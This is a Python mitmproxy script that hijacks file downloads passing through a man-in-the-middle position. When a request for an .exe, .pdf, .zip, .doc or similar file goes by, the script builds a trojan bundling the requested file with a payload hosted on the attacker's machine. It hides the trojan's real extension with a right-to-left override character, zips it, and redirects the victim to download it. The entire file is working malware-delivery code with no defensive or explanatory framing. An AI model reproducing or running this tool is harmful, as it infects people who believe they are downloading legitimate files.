import mitmproxy
import subprocess
import os
from Trojan import *
from mitmproxy import http
import json
import socket





# Open the config file
with open("config.json", "r") as f:
    config = json.load(f)

# Access the values in the config dictionary
evil_file = config["info"]["evil_file"]
path = config["info"]["path"] 

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except:
        local_ip = "Could not get local IP address"
    finally:
        s.close()
    return local_ip

IP = get_local_ip()

os.system(f"sudo cp -r {path} /tmp")
TARGET_TEXTENSIONS = [".exe", ".pdf",".zip",".rar",".doc",".msi"]
EVIL_FILE = f"http://{IP}:8000/{evil_file}"
WEB_ROOT = "/tmp/"
SPOOF_EXTENSION = True

def request(flow: mitmproxy.http.HTTPFlow):
	#code to handle request flows
	
	if flow.request.host != IP and flow.request.pretty_url.endswith(tuple(TARGET_TEXTENSIONS)):
		print("[+] Got interesting flow")
		
		front_file_name = flow.request.pretty_url.split("/")[-1].split(".")[0]
		front_file = flow.request.pretty_url + "#"
		download_file_name = front_file_name + ".exe"
		trojan_file = WEB_ROOT + download_file_name
		

		print("[+] Generating a trojan for " + flow.request.pretty_url)

		trojan = Trojan(front_file, EVIL_FILE, None, trojan_file)
		trojan.create()
		trojan.compile()

		if SPOOF_EXTENSION == True: 
			print("[+] Renaming trojan to spoof its extension")
			front_file_extension = (flow.request.pretty_url.split("/")[-1].split(".")[-1])
			if front_file_extension != "exe":
				new_name = front_file_name + "‮" + "".join(reversed(front_file_extension))  + ".exe"
				spoofed_file = WEB_ROOT + new_name
				os.rename(trojan_file, spoofed_file)
						
				trojan.zip(spoofed_file)
				download_file_name = front_file_name + ".zip"
		
		
		torjan_download_url = "http://" + IP + ":8000/" + download_file_name
		flow.response = http.Response.make(301, "", {"Location": torjan_download_url})
